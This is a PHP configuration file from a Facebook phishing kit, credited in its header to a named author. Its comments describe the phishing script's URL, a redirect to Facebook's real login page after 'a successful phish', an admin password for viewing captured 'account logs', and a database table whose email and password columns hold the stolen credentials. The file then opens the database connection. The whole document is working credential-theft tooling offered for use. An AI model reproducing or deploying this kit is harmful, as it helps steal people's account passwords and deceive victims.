<?php

###
#
#	Fill in all variables before using the script to avoid errors.
#	Also, be sure the database table is set up as stated below.
#
#	Script By: Kira@TronSX.com
#
###

$phisher_url = 'http://';							// URL to the phishing script.
$direct_url = 'http://www.facebook.com/login.php';	// URL to direct to after a successful phish.

$admin_pass = 'admin123';	// Password used to view account logs.
// Default admin URL is: http://yoursite.com/index.php?admin=admin123

$host	= 'localhost';	// SQL Host
$user	= '';			// Username
$pass	= '';			// Password
$db		= '';			// Database
$table	= '';			// Table : Must contain the three columns, "id", "email", and "pass".  "id" is an auto-increment column, and the other two are text!

# <!-- DO NOT EDIT BELOW THIS LINE -->

$link = mysql_pconnect($host, $user, $pass);
mysql_select_db($db, $link);

?>
